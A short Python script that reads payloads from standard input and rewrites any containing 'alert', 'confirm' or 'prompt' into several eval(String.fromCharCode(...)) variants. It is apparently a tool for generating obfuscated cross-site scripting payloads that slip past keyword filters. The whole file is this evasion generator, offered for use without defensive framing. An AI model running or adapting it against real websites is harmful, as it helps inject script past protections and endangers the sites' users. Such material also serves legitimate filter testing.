import sys
import re

def charcode_encode(payload):
    keywords = ['confirm', 'alert', 'prompt']
    for keyword in keywords:
        pattern = re.compile(keyword, re.IGNORECASE)
        match = pattern.search(payload)
        if match:
            start = match.start()
            encoded_payloads = []
            
            # Extract the function call part
            function_call = payload[start:]
            
            # Encode entire function call using String.fromCharCode
            char_codes = ','.join(str(ord(c)) for c in function_call)
            encoded_payloads.append(f"eval(String.fromCharCode({char_codes}))")
            
            # Encode just the keyword
            keyword_codes = ','.join(str(ord(c)) for c in keyword)
            rest = payload[start + len(keyword):]
            encoded_payloads.append(f"eval(String.fromCharCode({keyword_codes})+'{rest}')")
            
            # Encode each character individually with spread operator
            char_array = ','.join(str(ord(c)) for c in keyword)
            encoded_payloads.append(f"eval(String.fromCharCode(...[{char_array}])+'{rest}')")
            
            # Encode with Array.from
            char_array_list = ','.join(str(ord(c)) for c in function_call)
            encoded_payloads.append(f"eval(String.fromCharCode(...Array.from([{char_array_list}])))")
            
            # Progressive encoding - encode first few chars
            for i in range(1, len(keyword)):
                encoded_part = ','.join(str(ord(c)) for c in keyword[:i])
                plain_part = keyword[i:]
                encoded_payloads.append(f"eval(String.fromCharCode({encoded_part})+'{plain_part}{rest}')")
            
            # Encode with map
            char_list = ','.join(str(ord(c)) for c in function_call)
            encoded_payloads.append(f"eval(String.fromCharCode(...[{char_list}].map(x=>x)))")
            
            return encoded_payloads
    return [payload]

if __name__ == "__main__":
    for line in sys.stdin:
        payload = line.strip()
        encoded_payloads = charcode_encode(payload)
        for ep in encoded_payloads:
            print(ep)

